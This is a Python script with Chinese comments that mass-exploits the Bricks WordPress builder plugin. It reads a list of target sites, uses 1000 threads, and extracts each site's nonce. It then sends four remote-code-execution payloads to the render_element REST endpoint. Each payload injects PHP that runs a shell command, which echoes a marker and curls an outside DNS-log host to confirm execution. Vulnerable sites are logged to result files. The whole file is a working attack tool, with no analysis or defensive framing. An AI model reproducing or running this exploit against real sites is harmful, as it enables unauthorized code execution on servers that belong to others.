import requests
import threading
import queue
import re
import json
import urllib3

# 禁用不安全的 SSL 警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 定义全局队列和锁
url_queue = queue.Queue()
output_lock = threading.Lock()

# 定义HTTP请求头
headers_get = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:96.0) Gecko/20100101 Firefox/96.0',
    'Connection': 'close',
    'Accept-Encoding': 'gzip, deflate'
}

headers_post = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:58.0) Gecko/20100101 Firefox/58.0',
    'Connection': 'close',
    'Content-Type': 'application/json',
    'Accept-Encoding': 'gzip, deflate'
}

# 读取IP文件
with open('/root/WPBB/wpbba.txt', 'r') as file:
    urls = file.read().splitlines()

# 将URL添加到队列中，并确保URL格式正确
for url in urls:
    if url[:4] != "http":
        url = "http://" + url
    url_queue.put(url)

# 定义payload
payload_command = "echo 'WanLiChangChengWanLiChang';curl wpwpbb.6exdljr0.dnslog.pw"
payloads = [
    {
        "element": {
            "name": "carousel",
            "settings": {
                "type": "posts",
                "query": {
                    "useQueryEditor": True,
                    "queryEditor": f"throw new Exception(`{payload_command}`);"
                }
            }
        }
    },
    {
        "element": {
            "name": "container",
            "settings": {
                "hasLoop": "true",
                "query": {
                    "useQueryEditor": True,
                    "queryEditor": f"throw new Exception(`{payload_command}`);"
                }
            }
        }
    },
    {
        "element": "1",
        "loopElement": {
            "settings": {
                "query": {
                    "useQueryEditor": True,
                    "queryEditor": f"throw new Exception(`{payload_command}`);"
                }
            }
        }
    },
    {
        "element": {
            "name": "code",
            "settings": {
                "executeCode": "true",
                "code": f"<?php throw new Exception(`{payload_command}`); ?>"
            }
        }
    }
]

# 定义请求函数
def fetch_url():
    while not url_queue.empty():
        url = url_queue.get()
        try:
            response = requests.get(url, headers=headers_get, timeout=10, verify=False)
            if response.status_code == 200:
                match = re.search(r'<script id="bricks-scripts-js-extra">(.*?)</script>', response.text, re.DOTALL)
                if match:
                    nonce_value = re.search(r'"nonce"\s*:\s*"([^"]+)"', match.group(1))
                    if nonce_value:
                        nonce = nonce_value.group(1)
                        with output_lock:
                            with open('okurl.txt', 'a') as okurl_file:
                                okurl_file.write(url + '\n')
                            with open('well.txt', 'a') as well_file:
                                well_file.write(f'URL: {url}\nNonce: {nonce}\n\n')
                        send_post_request(url, nonce)
        except requests.RequestException as e:
            print(f"Error fetching {url}: {e}")
        finally:
            url_queue.task_done()

def send_post_request(url, nonce):
    post_url = url + "/wp-json/bricks/v1/render_element"
    
    for payload in payloads:
        data = {
            "postId": "1",
            "nonce": nonce,
            **payload
        }
        
        try:
            response = requests.post(post_url, headers=headers_post, data=json.dumps(data), timeout=10, verify=False)
            if response.status_code == 200 and "WanLiChangChengWanLiChang" in response.text:
                with output_lock:
                    with open('cgzrt.txt', 'a') as cgzr_file:
                        cgzr_file.write(url + '\n')
                    with open('cgdt.txt', 'a') as cgd_file:
                        cgd_file.write(f'URL: {url}\nNonce: {nonce}\nResponse: {response.text}\n\n')
                print(f"POST request successful for URL: {url} with payload type: {payload['element']['name'] if 'element' in payload else 'generic'}")
                break
        except requests.RequestException as e:
            print(f"Error posting to {post_url}: {e}")

# 创建和启动线程
threads = []
num_threads = 1000  # 根据需要调整线程数量

for i in range(num_threads):
    thread = threading.Thread(target=fetch_url)
    thread.start()
    threads.append(thread)

# 等待所有线程完成
for thread in threads:
    thread.join()

print("All urls checked.")
